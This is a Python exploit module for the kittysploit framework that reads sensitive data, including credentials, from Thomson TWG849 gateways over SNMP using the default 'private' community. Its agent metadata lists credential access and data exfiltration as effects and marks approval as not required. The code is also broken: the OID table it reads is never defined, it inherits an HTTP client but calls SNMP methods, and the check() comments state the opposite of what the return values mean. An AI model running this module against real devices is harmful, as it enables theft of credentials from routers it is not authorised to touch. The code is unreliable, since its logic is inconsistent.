#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Thomson TWG849 Info Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Thomson TWG849 Info Disclosure',
        'description': 'Module exploits Thomson TWG849 information disclosure vulnerability which allows reading sensitive information.',
        'author': ['Sebastian Perez', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://packetstormsecurity.com/files/133631/Thomson-CableHome-Gateway-DWG849-Information-Disclosure.html'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(161, "Target SNMP port")
    verbosity = OptBool(False, "Enable verbose output: true/false")

    def run(self):
        res = []

        print_status("Reading parameters...")
        for name in self.oids.keys():
            snmp_client = self.snmp_create()
            snmp = snmp_client.get("private", self.oids[name])
            if snmp:
                value = str(snmp[0][1])

                if value:
                    res.append((name, value))

        if res:
            print_success("Exploit success")
            print_table(("Parameter", "Value"), *res)
        else:
            print_error("Exploit failed - could not read sensitive information")
    def check(self):
        snmp_client = self.snmp_create()
        snmp = snmp_client.get("private", "1.3.6.1.2.1.1.1.0")
        if snmp:
            return True  # target is not vulnerable

        return False  # target is vulnerable
